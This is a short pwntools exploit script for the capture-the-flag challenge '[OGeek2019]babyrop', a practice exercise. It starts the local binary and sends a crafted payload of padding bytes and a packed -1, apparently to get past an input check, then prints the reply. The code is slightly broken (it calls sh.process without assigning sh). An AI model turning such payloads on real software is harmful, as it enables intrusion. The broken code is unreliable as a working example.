from pwn import *

path="/mnt/u/doc/pwn/buuctf/pwn/[OGeek2019]babyrop"

sh.process(path)

payload=b'a'*7+p64(-1)

sh.sendline(payload)

print(sh.recv())